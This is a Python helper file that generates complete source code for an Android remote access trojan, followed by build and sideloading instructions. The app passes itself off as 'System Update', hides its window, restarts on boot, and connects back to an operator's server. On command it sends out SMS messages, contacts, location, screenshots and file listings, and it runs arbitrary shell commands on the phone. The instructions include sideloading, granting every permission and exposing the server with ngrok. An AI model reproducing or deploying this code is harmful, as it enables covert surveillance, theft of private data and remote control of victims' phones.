#!/usr/bin/env python3
"""
Android Helper - Core functions for Android remote access
"""

class AndroidHelper:
    """Helper functions for Android remote access"""
    
    @staticmethod
    def generate_apk_payload_code(server_ip, server_port):
        """Generate Android app source code (Java)"""
        
        main_activity = f'''package com.system.update;

import android.app.Activity;
import android.os.Bundle;
import android.content.Intent;
import android.os.Build;
import android.widget.Toast;
import android.content.pm.PackageManager;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

public class MainActivity extends Activity {{
    
    private static final int PERMISSION_REQUEST_CODE = 100;
    private static final String[] REQUIRED_PERMISSIONS = {{
        android.Manifest.permission.READ_SMS,
        android.Manifest.permission.READ_CONTACTS,
        android.Manifest.permission.ACCESS_FINE_LOCATION,
        android.Manifest.permission.CAMERA,
        android.Manifest.permission.READ_EXTERNAL_STORAGE,
        android.Manifest.permission.WRITE_EXTERNAL_STORAGE
    }};
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {{
        super.onCreate(savedInstanceState);
        
        // Request permissions for Android 6+
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {{
            requestPermissions(REQUIRED_PERMISSIONS, PERMISSION_REQUEST_CODE);
        }} else {{
            startRemoteService();
        }}
    }}
    
    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {{
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE) {{
            startRemoteService();
        }}
    }}
    
    private void startRemoteService() {{
        Intent serviceIntent = new Intent(this, RemoteService.class);
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {{
            startForegroundService(serviceIntent);
        }} else {{
            startService(serviceIntent);
        }}
        
        Toast.makeText(this, "System Update installed", Toast.LENGTH_SHORT).show();
        finish();
    }}
}}'''

        remote_service = f'''package com.system.update;

import android.app.Service;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.Intent;
import android.os.IBinder;
import android.os.Build;
import android.content.Context;
import android.database.Cursor;
import android.provider.ContactsContract;
import android.provider.Telephony;
import android.location.Location;
import android.location.LocationManager;
import android.graphics.Bitmap;
import android.hardware.Camera;
import android.util.Base64;
import android.util.Log;
import androidx.core.app.NotificationCompat;
import org.json.JSONObject;
import org.json.JSONArray;
import java.net.Socket;
import java.io.*;
import java.util.List;

@SuppressWarnings("deprecation")
public class RemoteService extends Service {{
    private static final String SERVER_IP = "{server_ip}";
    private static final int SERVER_PORT = {server_port};
    private static final String TAG = "RemoteService";
    private static final String CHANNEL_ID = "remote_service_channel";
    
    private Socket socket;
    private BufferedReader reader;
    private PrintWriter writer;
    private boolean running = true;
    
    @Override
    public void onCreate() {{
        super.onCreate();
        
        // Create notification channel for Android O+
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {{
            createNotificationChannel();
            startForeground(1, createNotification());
        }}
    }}
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {{
        new Thread(new ConnectionThread()).start();
        return START_STICKY;
    }}
    
    private void createNotificationChannel() {{
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {{
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID,
                "System Update Service",
                NotificationManager.IMPORTANCE_LOW
            );
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {{
                manager.createNotificationChannel(channel);
            }}
        }}
    }}
    
    private android.app.Notification createNotification() {{
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {{
            return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("System Update")
                .setContentText("Running in background")
                .setSmallIcon(android.R.drawable.ic_menu_info_details)
                .build();
        }}
        return null;
    }}
    
    class ConnectionThread implements Runnable {{
        @Override
        public void run() {{
            while (running) {{
                try {{
                    Log.d(TAG, "Connecting to " + SERVER_IP + ":" + SERVER_PORT);
                    socket = new Socket(SERVER_IP, SERVER_PORT);
                    reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
                    writer = new PrintWriter(socket.getOutputStream(), true);
                    
                    // Send device info
                    sendDeviceInfo();
                    
                    // Command loop
                    String command;
                    while ((command = reader.readLine()) != null) {{
                        handleCommand(command);
                    }}
                    
                }} catch (Exception e) {{
                    Log.e(TAG, "Connection error: " + e.getMessage());
                }}
                
                // Reconnect after 10 seconds
                try {{
                    Thread.sleep(10000);
                }} catch (InterruptedException ie) {{
                    break;
                }}
            }}
        }}
    }}
    
    private void sendDeviceInfo() {{
        try {{
            JSONObject info = new JSONObject();
            info.put("type", "device_info");
            info.put("model", Build.MODEL);
            info.put("manufacturer", Build.MANUFACTURER);
            info.put("android_version", Build.VERSION.RELEASE);
            info.put("sdk_int", Build.VERSION.SDK_INT);
            sendResponse(info);
        }} catch (Exception e) {{
            Log.e(TAG, "Error sending device info", e);
        }}
    }}
    
    private void handleCommand(String commandStr) {{
        try {{
            JSONObject command = new JSONObject(commandStr);
            String action = command.getString("action");
            JSONObject data = command.optJSONObject("data");
            
            JSONObject response = new JSONObject();
            response.put("action", action);
            response.put("status", "success");
            
            switch (action) {{
                case "screenshot":
                    response.put("data", takeScreenshot());
                    break;
                    
                case "camera":
                    String camera = data != null ? data.optString("camera", "back") : "back";
                    response.put("image", capturePhoto(camera));
                    break;
                    
                case "sms":
                    response.put("data", readSMS());
                    break;
                    
                case "contacts":
                    response.put("data", readContacts());
                    break;
                    
                case "location":
                    JSONObject loc = getLocation();
                    response.put("lat", loc.getString("lat"));
                    response.put("lon", loc.getString("lon"));
                    break;
                    
                case "files":
                    String path = data != null ? data.optString("path", "/sdcard/") : "/sdcard/";
                    response.put("data", listFiles(path));
                    break;
                    
                case "shell":
                    String cmd = data != null ? data.optString("cmd", "") : "";
                    response.put("output", executeShell(cmd));
                    break;
                    
                case "device_info":
                    response.put("data", getDeviceInfo());
                    break;
                    
                default:
                    response.put("status", "error");
                    response.put("message", "Unknown command");
            }}
            
            sendResponse(response);
            
        }} catch (Exception e) {{
            Log.e(TAG, "Error handling command", e);
            try {{
                JSONObject error = new JSONObject();
                error.put("status", "error");
                error.put("message", e.getMessage());
                sendResponse(error);
            }} catch (Exception ignored) {{}}
        }}
    }}
    
    private String takeScreenshot() {{
        try {{
            Process process = Runtime.getRuntime().exec("screencap -p /sdcard/screen.png");
            process.waitFor();
            
            File file = new File("/sdcard/screen.png");
            if (file.exists()) {{
                FileInputStream fis = new FileInputStream(file);
                byte[] bytes = new byte[(int) file.length()];
                fis.read(bytes);
                fis.close();
                file.delete();
                return Base64.encodeToString(bytes, Base64.DEFAULT);
            }}
        }} catch (Exception e) {{
            Log.e(TAG, "Screenshot error", e);
        }}
        return "Screenshot requires additional permissions";
    }}
    
    private String capturePhoto(String cameraType) {{
        return "Camera feature requires camera2 API implementation";
    }}
    
    private String readSMS() {{
        try {{
            StringBuilder sms = new StringBuilder();
            Cursor cursor = getContentResolver().query(
                Telephony.Sms.CONTENT_URI,
                null, null, null, "date DESC LIMIT 50"
            );
            
            if (cursor != null) {{
                while (cursor.moveToNext()) {{
                    String address = cursor.getString(cursor.getColumnIndexOrThrow("address"));
                    String body = cursor.getString(cursor.getColumnIndexOrThrow("body"));
                    String date = cursor.getString(cursor.getColumnIndexOrThrow("date"));
                    
                    sms.append("From: ").append(address).append("\\n");
                    sms.append("Date: ").append(date).append("\\n");
                    sms.append("Message: ").append(body).append("\\n\\n");
                }}
                cursor.close();
            }}
            return sms.toString();
        }} catch (Exception e) {{
            Log.e(TAG, "SMS error", e);
            return "SMS read error: " + e.getMessage();
        }}
    }}
    
    private String readContacts() {{
        try {{
            StringBuilder contacts = new StringBuilder();
            Cursor cursor = getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null, null
            );
            
            if (cursor != null) {{
                int count = 0;
                while (cursor.moveToNext() && count < 100) {{
                    String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    String number = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                    
                    contacts.append("Name: ").append(name).append("\\n");
                    contacts.append("Number: ").append(number).append("\\n\\n");
                    count++;
                }}
                cursor.close();
            }}
            return contacts.toString();
        }} catch (Exception e) {{
            Log.e(TAG, "Contacts error", e);
            return "Contacts read error: " + e.getMessage();
        }}
    }}
    
    private JSONObject getLocation() {{
        JSONObject location = new JSONObject();
        try {{
            LocationManager lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
            Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            
            if (loc != null) {{
                location.put("lat", loc.getLatitude());
                location.put("lon", loc.getLongitude());
            }} else {{
                location.put("lat", "Unknown");
                location.put("lon", "Unknown");
            }}
        }} catch (Exception e) {{
            Log.e(TAG, "Location error", e);
            try {{
                location.put("lat", "Error");
                location.put("lon", "Error");
            }} catch (Exception ignored) {{}}
        }}
        return location;
    }}
    
    private String listFiles(String path) {{
        try {{
            File dir = new File(path);
            File[] files = dir.listFiles();
            
            if (files != null) {{
                StringBuilder fileList = new StringBuilder();
                for (File file : files) {{
                    fileList.append(file.isDirectory() ? "[DIR] " : "[FILE] ");
                    fileList.append(file.getName()).append("\\n");
                }}
                return fileList.toString();
            }}
            return "No files found or permission denied";
        }} catch (Exception e) {{
            Log.e(TAG, "File listing error", e);
            return "File listing error: " + e.getMessage();
        }}
    }}
    
    private String executeShell(String command) {{
        try {{
            Process process = Runtime.getRuntime().exec(command);
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            StringBuilder output = new StringBuilder();
            String line;
            
            while ((line = reader.readLine()) != null) {{
                output.append(line).append("\\n");
            }}
            
            process.waitFor();
            return output.toString();
        }} catch (Exception e) {{
            Log.e(TAG, "Shell error", e);
            return "Shell error: " + e.getMessage();
        }}
    }}
    
    private String getDeviceInfo() {{
        StringBuilder info = new StringBuilder();
        info.append("Manufacturer: ").append(Build.MANUFACTURER).append("\\n");
        info.append("Model: ").append(Build.MODEL).append("\\n");
        info.append("Android Version: ").append(Build.VERSION.RELEASE).append("\\n");
        info.append("SDK: ").append(Build.VERSION.SDK_INT).append("\\n");
        info.append("Device: ").append(Build.DEVICE).append("\\n");
        info.append("Brand: ").append(Build.BRAND).append("\\n");
        return info.toString();
    }}
    
    private void sendResponse(JSONObject response) {{
        if (writer != null) {{
            writer.println(response.toString());
            writer.flush();
        }}
    }}
    
    @Override
    public void onDestroy() {{
        running = false;
        try {{
            if (socket != null) socket.close();
        }} catch (Exception ignored) {{}}
        super.onDestroy();
    }}
    
    @Override
    public IBinder onBind(Intent intent) {{
        return null;
    }}
}}'''

        boot_receiver = '''package com.system.update;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;

public class BootReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {
            Intent serviceIntent = new Intent(context, RemoteService.class);
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(serviceIntent);
            } else {
                context.startService(serviceIntent);
            }
        }
    }
}'''

        manifest = '''<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.system.update">
    
    <!-- Network -->
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
    
    <!-- SMS & Contacts -->
    <uses-permission android:name="android.permission.READ_SMS" />
    <uses-permission android:name="android.permission.SEND_SMS" />
    <uses-permission android:name="android.permission.READ_CONTACTS" />
    
    <!-- Location -->
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
    
    <!-- Camera -->
    <uses-permission android:name="android.permission.CAMERA" />
    <uses-feature android:name="android.hardware.camera" android:required="false" />
    <uses-feature android:name="android.hardware.camera.front" android:required="false" />
    
    <!-- Storage -->
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
    
    <!-- Phone State -->
    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
    
    <!-- Microphone -->
    <uses-permission android:name="android.permission.RECORD_AUDIO" />
    
    <!-- Boot & Background -->
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
    <uses-permission android:name="android.permission.WAKE_LOCK" />
    
    <application
        android:label="System Update"
        android:icon="@android:drawable/ic_menu_info_details"
        android:requestLegacyExternalStorage="true">
        
        <activity android:name=".MainActivity"
            android:theme="@android:style/Theme.Translucent.NoTitleBar">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
        
        <service 
            android:name=".RemoteService"
            android:enabled="true"
            android:exported="false" />
        
        <receiver android:name=".BootReceiver"
            android:enabled="true"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED" />
            </intent-filter>
        </receiver>
    </application>
</manifest>'''

        build_gradle = '''apply plugin: 'com.android.application'

android {
    compileSdkVersion 30
    defaultConfig {
        applicationId "com.system.update"
        minSdkVersion 21
        targetSdkVersion 30
        versionCode 1
        versionName "1.0"
    }
    buildTypes {
        release {
            minifyEnabled false
        }
    }
}

dependencies {
    implementation 'androidx.appcompat:appcompat:1.3.1'
    implementation 'androidx.core:core:1.6.0'
}'''

        return {
            'MainActivity.java': main_activity,
            'RemoteService.java': remote_service,
            'BootReceiver.java': boot_receiver,
            'AndroidManifest.xml': manifest,
            'build.gradle': build_gradle,
            'server_ip': server_ip,
            'server_port': server_port
        }
    
    @staticmethod
    def create_build_instructions():
        """Instructions for building APK"""
        return """
╔════════════════════════════════════════════════════════════════╗
║        BUILD INSTRUCTIONS FOR ANDROID APK                      ║
╚════════════════════════════════════════════════════════════════╝

METHOD 1: Using Android Studio (Recommended for Testing)
─────────────────────────────────────────────────────────
1. Install Android Studio from https://developer.android.com/studio
2. Create New Project:
   - Select "Empty Activity"
   - Package name: com.system.update
   - Language: Java
   - Minimum SDK: API 21 (Android 5.0)

3. Replace Files:
   - Copy MainActivity.java to app/src/main/java/com/system/update/
   - Copy RemoteService.java to app/src/main/java/com/system/update/
   - Copy BootReceiver.java to app/src/main/java/com/system/update/
   - Copy AndroidManifest.xml to app/src/main/
   - Copy build.gradle to app/

4. Add Dependencies:
   - Open build.gradle (Module: app)
   - Add AndroidX dependencies (already in generated file)
   - Click "Sync Now"

5. Build APK:
   - Build > Build Bundle(s) / APK(s) > Build APK(s)
   - APK will be in app/build/outputs/apk/debug/
   - For release: Build > Generate Signed Bundle / APK

6. Install to Phone:
   - Enable "Unknown Sources" in phone settings
   - Transfer APK to phone
   - Install and open app
   - Grant all permissions when prompted


METHOD 2: Command Line Build (Gradle)
──────────────────────────────────────
1. Install Android SDK and set ANDROID_HOME
2. Place all files in proper directory structure:
   app/
   ├── build.gradle
   └── src/
       └── main/
           ├── AndroidManifest.xml
           └── java/
               └── com/
                   └── system/
                       └── update/
                           ├── MainActivity.java
                           ├── RemoteService.java
                           └── BootReceiver.java

3. Build: ./gradlew assembleDebug
4. APK location: app/build/outputs/apk/debug/app-debug.apk


METHOD 3: Online APK Builder (Quick & Easy)
────────────────────────────────────────────
⚠️  Not recommended for sensitive testing!

1. AppsGeyser: https://www.appsgeyser.com/
2. App Inventor: http://appinventor.mit.edu/
3. BuildFire: https://buildfire.com/

Note: Online builders may not support all features


IMPORTANT NOTES:
────────────────
✓ For testing on your own phone ONLY
✓ Grant all permissions when installing
✓ Disable battery optimization for the app
✓ Server must be running before opening app
✓ Phone and server must be on same network (or use ngrok)
✓ Check IP address is correct in RemoteService.java

TROUBLESHOOTING:
────────────────
- App crashes? Check logcat: adb logcat | grep RemoteService
- Can't connect? Verify server is running and IP is correct
- Permissions denied? Manually grant in Settings > Apps
- For Android 11+, you may need additional storage permissions

═══════════════════════════════════════════════════════════════
"""
